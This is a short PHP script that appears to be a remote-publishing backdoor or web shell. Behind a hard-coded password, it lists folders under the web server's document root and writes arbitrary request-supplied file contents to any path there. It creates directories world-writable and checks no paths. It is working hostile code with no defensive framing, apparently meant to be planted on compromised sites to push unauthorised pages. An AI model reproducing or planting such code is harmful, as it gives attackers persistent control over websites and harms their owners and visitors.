<?php
//header("Content-Type: text/html; charset=utf-8");
$config_password="yt";
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];

if($password!=$config_password)
{
    echo 'password error!';
    return;
}

if($action=='GetSubFolders')
{
	$MaxQuantity=$_REQUEST['MaxQuantity'];
	$dir= $_SERVER['DOCUMENT_ROOT'];
	$NowQuantity =0;
	$NowSubFolders ="";
	$dir_list = scandir($dir);
	foreach($dir_list as $file)
	{
		if($file==".." || $file==".")
		{
			 continue;
		}
		$fullpath=$dir."/".$file;
		if(is_dir($fullpath))
		{
			if(strpos('fff'.$file,'home')>0 or strpos('fff'.$file,'admin')>0 or strpos('fff'.$file,'cache')>0 or strpos('fff'.$file,'includes')>0 or strpos('fff'.$file,'Temp')>0 or strpos('fff'.$file,'!')>0 or strpos('fff'.$file,':')>0 or strpos('fff'.$file,'cgi')>0)
			{
				continue;
			}
			$NowSubFolders=$NowSubFolders."|".$file;
			$NowQuantity=$NowQuantity+1;
			if($NowQuantity>=$MaxQuantity)
			{
				break;
			}
		}
	}
	echo '__success__'.$NowSubFolders.'__success__';
}
else if($action=='UploadOne')
{
	  $foldername=$_REQUEST['foldername'];
	  $filename=$_REQUEST['filename'];
	  $filebody=$_REQUEST['filebody'];
    $path='';
    $rootPath= $_SERVER['DOCUMENT_ROOT'];

    if($foldername!='')
    {
		if($foldername=='current_folder')
		{
			$path=$filename;
		}
		else
		{
			createFolder($rootPath.'/'.$foldername);
			$path=$rootPath.'/'.$foldername.'/'.$filename;
		}
    }
    else
    {
		  $path=$rootPath.'/'.$filename;
    }
    
    $fp=fopen($path,"w");
    fwrite($fp,$filebody);
    fclose($fp);
    if(file_exists($path))
    {
		  echo "publish success & uploaded".$rootPath;
    }
}
    
function createFolder($path)
{
  if (!file_exists($path))
  {
    createFolder(dirname($path));
    mkdir($path, 0777);
  }
}
?>